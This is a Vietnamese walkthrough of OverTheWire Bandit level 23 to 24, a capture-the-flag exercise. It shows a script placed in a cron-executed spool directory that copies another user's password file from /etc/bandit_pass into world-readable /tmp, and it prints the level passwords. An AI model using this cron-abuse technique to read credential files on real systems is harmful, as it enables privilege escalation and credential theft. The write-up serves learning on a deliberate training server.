## 🕵️‍♂️ Challenge:  
### A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.  

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!  

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…  

Commands you may need to solve this level  
> chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## 📝 Solution:

Kết nối ssh đến máy chủ `bandit.labs.overthewire.org` với tên người dùng `bandit23`, cổng `2220`  
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```
Password lấy từ thử level trước:  
> 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

Tương tự phần trước, đọc nội dung file sh:  

<img width="834" height="555" alt="image" src="https://github.com/user-attachments/assets/4d73ac58-e741-4df4-a4ac-95a5d4143edc" />

Nội dung file:  
```bash
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi  
done  
```

Đọc qua thì đây là script cron chạy với user `bandit24`, nó vào `/var/spool/bandit24/foo`, thực thi mọi file do bandit23 sở hữu (với timeout 60) rồi xóa chúng.  
Vậy hiện ta đang ở bandit23 thì có thể tạo 1 script trong /var/spool/bandit24/foo để bandit24 sẽ chạy script đó và script có quyền đọc /etc/bandit_pass/bandit24 để lấy pass bandit24.  
Tiến hành đi vào trong thư mục đó và tạo script:  
```bash
cd /var/spool/bandit24/foo

cat > get_pass.sh <<'SH'
cp /etc/bandit_pass/bandit24 /tmp/bandit24_pass
chmod 644 /tmp/bandit24_pass
SH

chmod 755 get_pass.sh
```

Script sẽ copy mật khẩu bandit24 ra `/tmp` và cho tất cả đọc được. Sau đó ta chỉ cần cấp quyền cho script chạy theo chu kỳ.  
Đợi hoàn tất 1 chu kỳ, ta có thể đọc pass:  

<img width="768" height="84" alt="image" src="https://github.com/user-attachments/assets/7c22a19f-3d98-42ed-b67c-823f2b33dd29" />

Ok rồi đó.  

>### 🎯 Pass: ***gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8***
